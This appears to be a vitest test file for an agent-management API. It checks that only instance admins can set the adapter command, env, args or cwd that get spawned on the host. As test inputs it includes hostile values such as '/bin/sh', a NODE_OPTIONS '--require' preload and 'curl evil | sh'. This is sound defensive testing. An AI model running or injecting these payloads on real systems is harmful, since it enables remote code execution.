import express from "express";
import request from "supertest";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { ServerAdapterModule } from "../adapters/index.js";

const mockAccessService = vi.hoisted(() => ({
  canUser: vi.fn(),
  hasPermission: vi.fn(),
  ensureMembership: vi.fn(),
  setPrincipalPermission: vi.fn(),
}));

const mockCompanySkillService = vi.hoisted(() => ({
  listRuntimeSkillEntries: vi.fn(),
  resolveRequestedSkillKeys: vi.fn(),
}));

const mockSecretService = vi.hoisted(() => ({
  normalizeAdapterConfigForPersistence: vi.fn(async (_companyId: string, config: Record<string, unknown>) => config),
  resolveAdapterConfigForRuntime: vi.fn(async (_companyId: string, config: Record<string, unknown>) => ({ config })),
}));

const mockAgentInstructionsService = vi.hoisted(() => ({
  materializeManagedBundle: vi.fn(),
  getBundle: vi.fn(),
  readFile: vi.fn(),
  updateBundle: vi.fn(),
  writeFile: vi.fn(),
  deleteFile: vi.fn(),
  exportFiles: vi.fn(),
  ensureManagedBundle: vi.fn(),
}));

const mockBudgetService = vi.hoisted(() => ({
  upsertPolicy: vi.fn(),
}));

const mockHeartbeatService = vi.hoisted(() => ({
  cancelActiveForAgent: vi.fn(),
}));

const mockIssueApprovalService = vi.hoisted(() => ({
  linkManyForApproval: vi.fn(),
}));

const mockApprovalService = vi.hoisted(() => ({
  create: vi.fn(),
  getById: vi.fn(),
}));

const mockInstanceSettingsService = vi.hoisted(() => ({
  getGeneral: vi.fn(async () => ({ censorUsernameInLogs: false })),
}));

const mockLogActivity = vi.hoisted(() => vi.fn());

// A stored Hermes agent owned by company-1, configured earlier by an instance
// admin with a custom binary, env and cwd.
const STORED_AGENT_ID = "22222222-2222-4222-8222-222222222222";
const OTHER_COMPANY_AGENT_ID = "33333333-3333-4333-8333-333333333333";
const STORED_HERMES_CONFIG = {
  model: "glm-5.3-flash",
  hermesCommand: "/opt/custom/hermes",
  env: { HERMES_HOME: { type: "plain", value: "/srv/hermes" } },
  cwd: "/srv/work",
  extraArgs: ["-p", "agentdash", "--reasoning-effort", "medium"],
  timeoutSec: 1800,
  persistSession: true,
};

const mockAgentSvc = vi.hoisted(() => ({
  getById: vi.fn(),
  update: vi.fn(),
  create: vi.fn(),
  getConfigRevision: vi.fn(),
  rollbackConfigRevision: vi.fn(),
}));

function registerModuleMocks() {
  vi.doMock("../services/index.js", () => ({
    // Closes #327: routes/agents.ts also imports these from the barrel.
    agentInstructionRefreshService: () => ({ refreshForAgent: vi.fn(), refreshForRole: vi.fn() }),
    ISSUE_LIST_DEFAULT_LIMIT: 50,
    agentService: () => mockAgentSvc,
    agentInstructionsService: () => mockAgentInstructionsService,
    accessService: () => mockAccessService,
    approvalService: () => mockApprovalService,
    companySkillService: () => mockCompanySkillService,
    budgetService: () => mockBudgetService,
    heartbeatService: () => mockHeartbeatService,
    issueApprovalService: () => mockIssueApprovalService,
    issueService: () => ({}),
    logActivity: mockLogActivity,
    secretService: () => mockSecretService,
    syncInstructionsBundleConfigFromFilePath: vi.fn((_agent, config) => config),
    workspaceOperationService: () => ({}),
  }));

  vi.doMock("../services/instance-settings.js", () => ({
    instanceSettingsService: () => mockInstanceSettingsService,
  }));

  // routes/agents.ts imports secretService directly, not from the barrel.
  vi.doMock("../services/secrets.js", async () => ({
    ...(await vi.importActual<typeof import("../services/secrets.js")>("../services/secrets.js")),
    secretService: () => mockSecretService,
  }));
}

// AgentDash (security): POST /companies/:companyId/adapters/:type/test-environment
// spawns the adapter CLI on the host with the caller's adapterConfig after
// resolving company secret refs into it. Choosing the command/args/env/cwd is
// instance-admin only; members may still probe the server-default binary.

const probeAdapterType = "test_environment_authz_route_test";

const MEMBER = {
  type: "board",
  userId: "user-member",
  companyIds: ["company-1"],
  memberships: [{ companyId: "company-1", status: "active", membershipRole: "member" }],
  source: "session",
  isInstanceAdmin: false,
};
const INSTANCE_ADMIN = {
  type: "board",
  userId: "user-admin",
  companyIds: ["company-1"],
  source: "session",
  isInstanceAdmin: true,
};
const LOCAL_BOARD = {
  type: "board",
  userId: "local-board",
  companyIds: ["company-1"],
  source: "local_implicit",
  isInstanceAdmin: false,
};
const AGENT = {
  type: "agent",
  agentId: "agent-1",
  companyId: "company-1",
};

async function createApp(actor: Record<string, unknown>, db: unknown = companyDb()) {
  const [{ agentRoutes }, { errorHandler }] = await Promise.all([
    vi.importActual<typeof import("../routes/agents.js")>("../routes/agents.js"),
    vi.importActual<typeof import("../middleware/index.js")>("../middleware/index.js"),
  ]);
  const app = express();
  app.use(express.json());
  app.use((req, _res, next) => {
    (req as any).actor = actor;
    next();
  });
  app.use("/api", agentRoutes(db as any));
  app.use(errorHandler);
  return app;
}

// Enough of a db for the routes that read the company row before persisting.
function companyDb() {
  return {
    select: vi.fn(() => ({
      from: vi.fn(() => ({
        where: vi.fn(async () => [{ id: "company-1", requireBoardApprovalForNewAgents: false }]),
      })),
    })),
  };
}

async function requestApp(
  app: express.Express,
  buildRequest: (baseUrl: string) => request.Test,
) {
  const { createServer } = await vi.importActual<typeof import("node:http")>("node:http");
  const server = createServer(app);
  try {
    await new Promise<void>((resolve) => {
      server.listen(0, "127.0.0.1", resolve);
    });
    const address = server.address();
    if (!address || typeof address === "string") {
      throw new Error("Expected HTTP server to listen on a TCP port");
    }
    return await buildRequest(`http://127.0.0.1:${address.port}`);
  } finally {
    if (server.listening) {
      await new Promise<void>((resolve, reject) => {
        server.close((error) => {
          if (error) reject(error);
          else resolve();
        });
      });
    }
  }
}

async function unregisterTestAdapter(type: string) {
  const { unregisterServerAdapter } = await import("../adapters/index.js");
  unregisterServerAdapter(type);
}

describe("adapter test-environment host-execution authz", () => {
  let testEnvironment: ReturnType<typeof vi.fn>;

  beforeEach(async () => {
    vi.resetModules();
    vi.doUnmock("../routes/agents.js");
    vi.doUnmock("../routes/authz.js");
    vi.doUnmock("../middleware/index.js");
    registerModuleMocks();
    vi.clearAllMocks();
    delete process.env.AGENTDASH_ADAPTER_ENV_BYPASS;
    mockCompanySkillService.listRuntimeSkillEntries.mockResolvedValue([]);
    mockCompanySkillService.resolveRequestedSkillKeys.mockResolvedValue([]);
    // Members hold no agents:create grant; agents do.
    mockAccessService.canUser.mockResolvedValue(false);
    mockAccessService.hasPermission.mockResolvedValue(true);
    mockLogActivity.mockResolvedValue(undefined);
    mockAgentSvc.getById.mockImplementation(async (id: string) => {
      if (id === "agent-1") {
        return { id, companyId: "company-1", name: "CoS", permissions: { canCreateAgents: true } };
      }
      if (id === STORED_AGENT_ID) {
        return {
          id,
          companyId: "company-1",
          name: "Priya",
          role: "general",
          adapterType: "hermes_local",
          adapterConfig: structuredClone(STORED_HERMES_CONFIG),
          runtimeConfig: {},
        };
      }
      if (id === OTHER_COMPANY_AGENT_ID) {
        return { id, companyId: "company-2", adapterType: "hermes_local", adapterConfig: { command: "/x" } };
      }
      return null;
    });
    await unregisterTestAdapter(probeAdapterType);
    testEnvironment = vi.fn(async () => ({
      adapterType: probeAdapterType,
      status: "pass",
      checks: [],
      testedAt: new Date(0).toISOString(),
    }));
    const { registerServerAdapter } = await import("../adapters/index.js");
    const adapter: ServerAdapterModule = {
      type: probeAdapterType,
      execute: async () => ({ exitCode: 0, signal: null, timedOut: false }),
      testEnvironment: testEnvironment as unknown as ServerAdapterModule["testEnvironment"],
    };
    registerServerAdapter(adapter);
  });

  afterEach(async () => {
    await unregisterTestAdapter(probeAdapterType);
  });

  async function probe(actor: Record<string, unknown>, adapterConfig: Record<string, unknown>) {
    const app = await createApp(actor);
    return requestApp(app, (baseUrl) =>
      request(baseUrl)
        .post(`/api/companies/company-1/adapters/${probeAdapterType}/test-environment`)
        .send({ adapterConfig }),
    );
  }

  it.each([
    ["command", { command: "/bin/sh" }],
    ["env with a secret ref", { env: { NODE_OPTIONS: "--require ./x.js", KEY: { type: "secret_ref", secretId: "11111111-1111-4111-8111-111111111111" } } }],
    ["extraArgs", { extraArgs: ["-c", "id"] }],
    ["args", { args: ["-c", "id"] }],
    ["cwd", { cwd: "/var/tmp" }],
    ["hermesCommand", { hermesCommand: "/bin/sh" }],
    ["agentCommand", { agent: "custom", agentCommand: "sh -c id" }],
    ["stateDir", { stateDir: "/var/tmp/evil" }],
  ])("403s a non-admin member who supplies %s, before secrets resolve or anything spawns", async (_label, adapterConfig) => {
    const res = await probe(MEMBER, { model: "m", ...adapterConfig });
    expect(res.status, JSON.stringify(res.body)).toBe(403);
    expect(res.body.error).toMatch(/Instance admin/);
    expect(testEnvironment).not.toHaveBeenCalled();
    expect(mockSecretService.resolveAdapterConfigForRuntime).not.toHaveBeenCalled();
  });

  it("403s an agent key that supplies a command even with agents:create", async () => {
    const res = await probe(AGENT, { command: "/bin/sh" });
    expect(res.status, JSON.stringify(res.body)).toBe(403);
    expect(testEnvironment).not.toHaveBeenCalled();
  });

  it("lets a member probe the server-default binary (no host-execution overrides)", async () => {
    const res = await probe(MEMBER, { model: "claude-sonnet", command: "", env: {}, extraArgs: [] });
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    expect(testEnvironment).toHaveBeenCalledTimes(1);
  });

  it("lets an instance admin test a custom command and env", async () => {
    const res = await probe(INSTANCE_ADMIN, { command: "/usr/local/bin/claude", env: { A: "b" }, cwd: "/var/tmp" });
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    expect(testEnvironment).toHaveBeenCalledTimes(1);
  });

  it("lets the local_trusted implicit board test a custom command", async () => {
    const res = await probe(LOCAL_BOARD, { command: "/usr/local/bin/claude" });
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    expect(testEnvironment).toHaveBeenCalledTimes(1);
  });
});

// AgentDash (security, #719): the same classifier gates the Hermes preset on
// test-environment (a company owner must be able to Test Hermes on their own
// box) and the stored-config comparison used by the edit form.
const COMPANY_OWNER = {
  type: "board",
  userId: "user-owner",
  companyIds: ["company-1"],
  memberships: [{ companyId: "company-1", status: "active", membershipRole: "owner" }],
  source: "session",
  isInstanceAdmin: false,
};

describe("hermes_local test-environment and the stored-config comparison", () => {
  const originalBypass = process.env.AGENTDASH_ADAPTER_ENV_BYPASS;

  beforeEach(async () => {
    vi.resetModules();
    vi.doUnmock("../routes/agents.js");
    vi.doUnmock("../routes/authz.js");
    vi.doUnmock("../middleware/index.js");
    registerModuleMocks();
    vi.clearAllMocks();
    // The gate runs BEFORE the bypass, so the bypass isolates the gate from
    // the real hermes binary.
    process.env.AGENTDASH_ADAPTER_ENV_BYPASS = "true";
    mockAccessService.canUser.mockResolvedValue(false);
    mockAgentSvc.getById.mockImplementation(async (id: string) =>
      id === STORED_AGENT_ID
        ? { id, companyId: "company-1", adapterType: "hermes_local", adapterConfig: structuredClone(STORED_HERMES_CONFIG) }
        : id === OTHER_COMPANY_AGENT_ID
          ? { id, companyId: "company-2", adapterType: "hermes_local", adapterConfig: { command: "/x" } }
          : null,
    );
  });

  afterEach(() => {
    if (originalBypass === undefined) delete process.env.AGENTDASH_ADAPTER_ENV_BYPASS;
    else process.env.AGENTDASH_ADAPTER_ENV_BYPASS = originalBypass;
  });

  async function probeHermes(actor: Record<string, unknown>, body: Record<string, unknown>) {
    const app = await createApp(actor);
    return requestApp(app, (baseUrl) =>
      request(baseUrl).post("/api/companies/company-1/adapters/hermes_local/test-environment").send(body),
    );
  }

  it("lets a company owner Test the Hermes preset with a profile and reasoning effort", async () => {
    const res = await probeHermes(COMPANY_OWNER, {
      adapterConfig: {
        model: "glm-5.3-flash",
        hermesCommand: "hermes",
        timeoutSec: 1800,
        persistSession: true,
        extraArgs: ["-p", "agentdash", "--reasoning-effort", "high"],
      },
    });
    expect(res.status, JSON.stringify(res.body)).toBe(200);
  });

  it("403s a company owner who slips a non-allowlisted flag into Hermes extraArgs", async () => {
    const res = await probeHermes(COMPANY_OWNER, {
      adapterConfig: { extraArgs: ["--reasoning-effort", "high", "--exec", "id"] },
    });
    expect(res.status, JSON.stringify(res.body)).toBe(403);
    expect(res.body.error).toMatch(/Instance admin/);
  });

  it("accepts the edit form resending the stored config unchanged (compared on the server)", async () => {
    const res = await probeHermes(MEMBER, {
      agentId: STORED_AGENT_ID,
      // The edit form sends env as stored; the bare-string form must also match.
      adapterConfig: { ...STORED_HERMES_CONFIG, env: { HERMES_HOME: "/srv/hermes" } },
    });
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    expect(mockAgentSvc.getById).toHaveBeenCalledWith(STORED_AGENT_ID);
  });

  it("403s when the edit form changes a stored host-execution value", async () => {
    const res = await probeHermes(MEMBER, {
      agentId: STORED_AGENT_ID,
      adapterConfig: { ...STORED_HERMES_CONFIG, hermesCommand: "/bin/sh" },
    });
    expect(res.status, JSON.stringify(res.body)).toBe(403);
    expect(res.body.error).toMatch(/hermesCommand/);
  });

  it("does not trust a stored config from another company's agent", async () => {
    const res = await probeHermes(MEMBER, {
      agentId: OTHER_COMPANY_AGENT_ID,
      adapterConfig: { command: "/x" },
    });
    expect(res.status, JSON.stringify(res.body)).toBe(404);
  });

  it("403s a stored-looking config without an agentId to compare against", async () => {
    const res = await probeHermes(MEMBER, { adapterConfig: STORED_HERMES_CONFIG });
    expect(res.status, JSON.stringify(res.body)).toBe(403);
  });
});

describe("agent create, hire, update and rollback host-execution authz (#719)", () => {
  beforeEach(async () => {
    vi.resetModules();
    vi.doUnmock("../routes/agents.js");
    vi.doUnmock("../routes/authz.js");
    vi.doUnmock("../middleware/index.js");
    registerModuleMocks();
    vi.clearAllMocks();
    delete process.env.AGENTDASH_ADAPTER_ENV_BYPASS;
    mockCompanySkillService.listRuntimeSkillEntries.mockResolvedValue([]);
    mockCompanySkillService.resolveRequestedSkillKeys.mockResolvedValue([]);
    // These members hold agent-configuration authority; the host-execution
    // gate is the only thing standing between them and a custom command.
    mockAccessService.canUser.mockResolvedValue(true);
    mockAccessService.hasPermission.mockResolvedValue(true);
    mockLogActivity.mockResolvedValue(undefined);
    mockSecretService.normalizeAdapterConfigForPersistence.mockImplementation(async () => {
      throw new Error("REACHED_PERSISTENCE");
    });
    mockAgentSvc.getById.mockImplementation(async (id: string) =>
      id === STORED_AGENT_ID
        ? {
            id,
            companyId: "company-1",
            name: "Priya",
            role: "general",
            adapterType: "hermes_local",
            adapterConfig: structuredClone(STORED_HERMES_CONFIG),
            runtimeConfig: {},
          }
        : null,
    );
  });

  afterEach(() => {
    mockSecretService.normalizeAdapterConfigForPersistence.mockImplementation(
      async (_companyId: string, config: Record<string, unknown>) => config,
    );
  });

  async function send(
    actor: Record<string, unknown>,
    build: (r: ReturnType<typeof request>) => request.Test,
  ) {
    const app = await createApp(actor);
    return requestApp(app, (baseUrl) => build(request(baseUrl)));
  }

  function expectHostExecRefusal(res: request.Response) {
    expect(res.status, JSON.stringify(res.body)).toBe(403);
    expect(res.body.error).toMatch(/Instance admin access required/);
  }

  // Later stages of these routes need more of the app than this harness
  // mocks, so persistence normalization — the first step after the gate —
  // stops the request with a sentinel. Reaching it proves the gate let it by.
  function expectPassedHostExecGate(res: request.Response) {
    expect(String(res.body?.error ?? ""), JSON.stringify(res.body)).not.toMatch(/Instance admin access required/);
    expect(mockSecretService.normalizeAdapterConfigForPersistence, `${res.status} ${JSON.stringify(res.body)}`).toHaveBeenCalled();
  }

  const injections: Array<[string, Record<string, unknown>]> = [
    ["command", { command: "/bin/sh" }],
    ["env", { env: { NODE_OPTIONS: "--require /tmp/x.js" } }],
    ["args", { args: ["-c", "curl evil | sh"] }],
    ["cwd", { cwd: "/etc" }],
  ];

  it.each(injections)("POST /agents refuses a member-set %s", async (_label, injected) => {
    const res = await send(MEMBER, (r) =>
      r.post("/api/companies/company-1/agents").send({
        name: "x",
        adapterType: "claude_local",
        adapterConfig: { model: "m", ...injected },
      }),
    );
    expectHostExecRefusal(res);
    expect(mockAgentSvc.create).not.toHaveBeenCalled();
  });

  it.each(injections)("POST /agent-hires refuses a member-set %s", async (_label, injected) => {
    const res = await send(MEMBER, (r) =>
      r.post("/api/companies/company-1/agent-hires").send({
        name: "x",
        adapterType: "claude_local",
        adapterConfig: { model: "m", ...injected },
      }),
    );
    expectHostExecRefusal(res);
  });

  it("POST /agent-hires refuses a command smuggled through a runtimeConfig model profile", async () => {
    const res = await send(MEMBER, (r) =>
      r.post("/api/companies/company-1/agent-hires").send({
        name: "x",
        adapterType: "claude_local",
        adapterConfig: { model: "m" },
        runtimeConfig: { modelProfiles: { cheap: { adapterConfig: { command: "/bin/sh" } } } },
      }),
    );
    expectHostExecRefusal(res);
  });

  it("POST /agents lets a company owner create a Hermes agent from the preset", async () => {
    const res = await send(COMPANY_OWNER, (r) =>
      r.post("/api/companies/company-1/agents").send({
        name: "Hermes worker",
        adapterType: "hermes_local",
        adapterConfig: {
          model: "glm-5.3-flash",
          hermesCommand: "hermes",
          timeoutSec: 1800,
          persistSession: true,
          extraArgs: ["-p", "agentdash", "--reasoning-effort", "low"],
        },
      }),
    );
    expectPassedHostExecGate(res);
  });

  it("POST /agents lets the instance admin set a custom command", async () => {
    const res = await send(INSTANCE_ADMIN, (r) =>
      r.post("/api/companies/company-1/agents").send({
        name: "custom",
        adapterType: "claude_local",
        adapterConfig: { command: "/usr/local/bin/claude-wrapper", env: { A: "b" }, cwd: "/srv" },
      }),
    );
    expectPassedHostExecGate(res);
  });

  it.each(injections)("PATCH /agents/:id refuses a member-set %s", async (_label, injected) => {
    const res = await send(MEMBER, (r) =>
      r.patch(`/api/agents/${STORED_AGENT_ID}`).send({ adapterConfig: injected }),
    );
    expectHostExecRefusal(res);
    expect(mockAgentSvc.update).not.toHaveBeenCalled();
  });

  it("PATCH /agents/:id accepts the stored config resent unchanged in edit mode", async () => {
    const res = await send(MEMBER, (r) =>
      r.patch(`/api/agents/${STORED_AGENT_ID}`).send({
        adapterConfig: { ...STORED_HERMES_CONFIG, model: "glm-5.3" },
      }),
    );
    expectPassedHostExecGate(res);
  });

  it("PATCH /agents/:id lets a company owner switch Hermes reasoning effort and profile", async () => {
    const res = await send(COMPANY_OWNER, (r) =>
      r.patch(`/api/agents/${STORED_AGENT_ID}`).send({
        adapterConfig: { extraArgs: ["-p", "work", "--reasoning-effort", "high"] },
      }),
    );
    expectPassedHostExecGate(res);
  });

  it("PATCH /agents/:id lets the instance admin change the command", async () => {
    const res = await send(INSTANCE_ADMIN, (r) =>
      r.patch(`/api/agents/${STORED_AGENT_ID}`).send({ adapterConfig: { hermesCommand: "/opt/other/hermes" } }),
    );
    expectPassedHostExecGate(res);
  });

  it("rollback refuses a member restoring a different command", async () => {
    mockAgentSvc.getConfigRevision.mockResolvedValue({
      id: "rev-1",
      afterConfig: {
        name: "Priya",
        role: "general",
        adapterType: "hermes_local",
        budgetMonthlyCents: 0,
        adapterConfig: { ...STORED_HERMES_CONFIG, hermesCommand: "/tmp/evil" },
        runtimeConfig: {},
      },
    });
    const res = await send(MEMBER, (r) =>
      r.post(`/api/agents/${STORED_AGENT_ID}/config-revisions/rev-1/rollback`).send({}),
    );
    expectHostExecRefusal(res);
    expect(mockAgentSvc.rollbackConfigRevision).not.toHaveBeenCalled();
  });
});
